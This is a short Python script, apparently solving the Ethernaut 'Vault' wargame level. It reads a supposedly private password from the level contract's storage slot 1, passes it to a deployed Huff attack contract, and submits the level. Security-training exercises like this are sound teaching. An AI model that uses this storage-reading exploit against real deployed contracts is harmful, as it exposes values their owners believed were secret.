from ape import accounts, networks
from ..utils.helper import (
    get_level_instance,
    level_completed,
    deploy_huff_contract,
    encode,
    get_sig,
    send_tx,
)

ETHERNAUT = "0xD2e5e0102E55a5234379DD796b8c641cd5996Efd"
LEVEL = "0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6"


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    # deploy hacker contract
    print("\n--- Huff Huff... Deploying hacker contract ---\n")
    hacker = deploy_huff_contract("Vault.huff", instance, user, value=1)

    # exploit goes here
    password = networks.provider.get_storage_at(instance, 1)
    print(f"\n--- password stored at slot 1 of instance is: {password} ---\n")

    print("\n--- Exploiting level instance ---\n")
    calldata = get_sig("attack(bytes32)") + encode(["bytes32"], [password]).hex()
    send_tx(user, hacker, calldata)

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
